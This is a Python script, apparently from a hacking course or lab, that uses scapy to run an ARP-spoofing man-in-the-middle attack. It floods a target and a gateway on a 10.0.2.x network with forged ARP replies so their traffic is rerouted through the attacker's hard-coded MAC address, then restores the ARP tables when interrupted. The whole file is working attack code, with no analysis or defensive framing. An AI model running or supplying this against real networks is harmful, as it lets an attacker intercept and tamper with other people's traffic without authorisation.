#! usr/bin/env python3

from datetime import time
import time as t
import sys

import scapy.all as scapy
from scapy.packet import Packet

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    arp_request_broadcast = broadcast / arp_request
    (answered_list) = scapy.srp(arp_request_broadcast, timeout = 1, verbose=False)[0]

    return (answered_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac('10.0.2.4')
    packet = scapy.ARP(op= 2, pdst= target_ip, hwsrc= '08:00:27:08:af:07', psrc= spoof_ip)
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, verbose= False)

def restore (destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet=scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)

target_ip = '10.0.2.2'
gateway_ip= '10.0.2.3'
try:
    sent_packet_count = 0
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        sent_packet_count = sent_packet_count + 2
        print("\r[+] Packet sent: " + str(sent_packet_count), end=' ')
        t.sleep(2)
except KeyboardInterrupt:
        print('\n[-] CTRL + C Detected... Restoring.\n')
        restore(target_ip, gateway_ip)
        restore(gateway_ip, target_ip)

